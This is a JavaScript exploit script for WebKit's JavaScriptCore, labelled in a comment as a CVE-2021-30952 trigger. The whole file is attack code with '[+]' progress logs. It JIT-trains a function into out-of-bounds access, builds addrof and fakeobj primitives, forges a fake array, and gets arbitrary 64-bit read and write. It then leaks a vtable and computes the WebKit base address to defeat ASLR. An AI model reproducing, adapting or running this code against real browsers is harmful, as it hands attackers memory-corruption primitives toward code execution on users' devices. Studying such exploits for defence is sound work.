const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);

function f2i(val) {
    f64[0] = val;
    return u32[1] * 0x100000000 + u32[0];
}

function i2f(val) {
    let tmp = [];
    tmp[0] = parseInt(val % 0x100000000);
    tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
    u32.set(tmp);
    return f64[0];
}

function i2obj(val) {
    return i2f(val-0x02000000000000);
}

function pwn() {
    log("[+] setting up stuff...");
    const scratchBuf = new ArrayBuffer(64);
    const u32View = new Uint32Array(scratchBuf);
    const f64View = new Float64Array(scratchBuf);

    const randRange = (lo, hi) => {
        lo = Math.ceil(lo);
        hi = Math.ceil(hi);
        return Math.floor(Math.random() * (hi - lo) + lo);
    };
    const nanTag = randRange(1, 8) << 8 | randRange(1, 8) << 4 | randRange(1, 8) << 0;
    const nanPayload = randRange(1, 0xFFFFFF);
    const boxIndex = (arrayIndex, elementIndex) => {
        if (arrayIndex > 0xFFFF || arrayIndex < 0) throw new Error("");
        if (elementIndex > 0xFF || elementIndex < 0) throw new Error("");
        u32View[1] = nanTag << 20 | 4 << 16 | arrayIndex;
        u32View[0] = elementIndex << 24 | nanPayload;
        const result = f64View[0];
        if (isNaN(result)) throw new Error("");
        return result;
    };
    let t = new Array(400);  // Main array, 400 elements
    t.fill([]);
    let currentTarget = null;
    let triggerValue = 0;
    let triggerReplace = null;
    let triggerBool = false;
    let triggerFlag1 = -1;
    let triggerFlag2 = -1;
    // Coruna CVE-2021-30952 trigger
    function jit_me(t, e, r, f, n, i, other_array, nested_idx, u, oob_value) {
        const target_array = t;
        let idx = e;
        const b = f;
        const k = n;
        const d = i;
        const len = target_array.length;
        for (let t = 0; t < 2; t++) {
            if (b === true) {
                if(!(idx === -2147483648)) return -1
                    } else if (!(idx > 2147483647)) return -2;
            if (k === 0) idx = 0;
            if (idx < len) {
                if (k !== 0) idx -= 2147483647-7;
                if (idx < 0) return -3;
                // target_array[idx] = 2.66289667873244264257e-314;
                let t = target_array[idx]; // read the leaked data from t[201] array
                if (d) {
                    target_array[idx] = r;
                    
                    if (u === 0) t = other_array[nested_idx][0];
                    else other_array[nested_idx][0] = oob_value
                        }
                return t
            }
            if( t > 0 ) break
        }
        return -4
    }
    const g = new Array(16).fill([]).map((_, r) => {
        const i = JSON.parse("[[1.1, 1.2], [1.2, 1.3], [1.3, 3.4]]");
        for (const t of i) {
            t[0] = 0.1 + r;
            t["a" + r] = r;
        }
        return i;
    });
    const y = 200;
    t = t.map(((t, r) => {
        const i = JSON.parse("[0.1, 0.3, 1.1, 2.3]");
        if (i[0] = .1 + r, r !== y) {
            i[0] = [];
            for (const t in i) 0 !== t && (i[t] = boxIndex(r, t))
        }
        return i
    }));
    log("[+] prepping the jit...");
    const main_target_array = t[200];
    for (let iter = 0; iter < 1000000; iter++) {
        currentTarget = main_target_array;
        triggerReplace = iter % 2 != 0 ? 0.1 : 0.2;
        triggerValue = -2147483648;     // INT32_MIN
        triggerFlag1 = true;
        triggerFlag2 = 0;
        // Call with INT32_MIN, b=true path
        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2,
        true, g[iter % g.length], 0, iter % 2, 0.1 + iter);
        // Call with INT32_MAX, b=false path
        triggerValue = 2147483647 - iter % 3;  // INT32_MAX or close to it
        triggerFlag1 = !(1 & iter);             // alternating boolean
        triggerFlag2 = 0 + iter % 3;            // 0, 1, or 2
        jit_me(currentTarget, triggerValue, triggerReplace, triggerFlag1, triggerFlag2, false, g[iter % g.length], 0, iter % 2, 0.1 + iter);
    }
    log("[+] jit'd our trigger function");

    function addrof_pre(obj) {
        t[201][2] = obj;
        let leak = jit_me(main_target_array, -2147483648, true, true, 1, false, g[0], 0, 0, 0);
        return f2i(leak);
    }
    function fakeobj_pre(addr) {
        jit_me(main_target_array, -2147483648, i2f(addr), true, 1, true, g[0], 0, 0, 0)
        return t[201][2];
    }
    
    // From https://github.com/wh1te4ever/WebKit-Bug-256172
    function LeakStructureID(obj) {
        let container = {
            cellHeader: i2obj(0x0108200700000000),
            butterfly: obj
        };
        let fakeObjAddr = addrof_pre(container) + 0x10;
        log(`[+] fakeObjAddr: 0x${fakeObjAddr.toString(16)}`);
        let fakeObj = fakeobj_pre(fakeObjAddr);
        f64[0] = fakeObj[0];
        let structureID = u32[0];
        u32[1] = 0x01082307 - 0x20000;
        container.cellHeader = f64[0];
        return structureID;
    }
    
    let noCoW = 13.37;
    var arrLeak = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8);
    let structureID = LeakStructureID(arrLeak);
    log(`[+] leak structureID: 0x${structureID.toString(16)}`);
    pad = [{}, {}, {}];
    var victim = [noCoW, 14.47, 15.57];
    victim['prop'] = 13.37;
    victim['prop_1'] = 13.37;
    u32[0] = structureID;
    u32[1] = 0x01082309-0x20000;
    var container = {
        cellHeader: f64[0],
        butterfly: victim
    };
    var containerAddr = addrof_pre(container);
    var fakeArrAddr = containerAddr + 0x10;
    var driver = fakeobj_pre(fakeArrAddr);
    var unboxed = [noCoW, 13.37, 13.37];
    var boxed = [{}];
    driver[1] = unboxed;
    var sharedButterfly = victim[1];
    driver[1] = boxed;
    victim[1] = sharedButterfly;
    u32[0] = structureID;
    u32[1] = 0x01082307-0x20000;
    container.cellHeader = f64[0];
    
    function addrof(obj) {
        boxed[0] = obj;
        return f2i(unboxed[0]);
    }
    function fakeobj(addr) {
        unboxed[0] = i2f(addr);
        return boxed[0];
    }
    function read64(addr) {
        driver[1] = i2f(addr + 0x10);
        return addrof(victim.prop);
    }
    function write64(addr, val) {
        driver[1] = i2f(addr + 0x10);
        victim.prop = i2f(val);
    }
    
    // example read32 using Uint32Array for float to integer conversion
    let buffer = new Uint32Array(2);
    buffer.fill(0x41414141);
    let addr = addrof(buffer);
    log(`[+] addr: 0x${addr.toString(16)}`);
    let bytes_addr = read64(addr + 0x10);
    log(`[+] bytes_addr: 0x${bytes_addr.toString(16)}`);
    
//    function read32_poc(addr) {
//        driver[1] = i2f(addr + 0x10);
//        boxed[0] = victim.prop;
//        let value = unboxed[0];
//        driver[1] = i2f(bytes_addr + 0x10);
//        victim.prop = value;
//        return buffer[0];
//    }
//    function write32_poc(addr, val) {
//        buffer[0] = val;
//        driver[1] = i2f(bytes_addr + 0x10);
//        boxed[0] = victim.prop;
//        let value = unboxed[0];
//        driver[1] = i2f(addr + 0x10);
//        victim.prop = value;
//    }
    
    log(`[+] read64 -> 0x${read64(bytes_addr).toString(16)}`);
    write64(bytes_addr, 0x42424242);
    log(`[+] read64 -> 0x${read64(bytes_addr).toString(16)}`);
    log(`[+] buffer[0]: 0x${buffer[0].toString(16)}`);
    log(`[+] buffer[1]: 0x${buffer[1].toString(16)}`);
    let vtable_addr = read64(read64(addrof(document.createElement('div')) + 0x10));
    log(`[+] vtable address: 0x${vtable_addr.toString(16)}`);
    let webkit_base = vtable_addr - 0x2ce4dd1;
    log(`[+] WebKit base address: 0x${webkit_base.toString(16)}`);
    log(`[+] read64 -> 0x${read64(webkit_base).toString(16)}`);
//    log(`[+] read32_poc -> 0x${read32_poc(webkit_base).toString(16)}`);
//    write32_poc(bytes_addr + 4, 0x41424344);
//    log(`[+] read32_poc -> 0x${read32_poc(bytes_addr + 4).toString(16)}`);
}
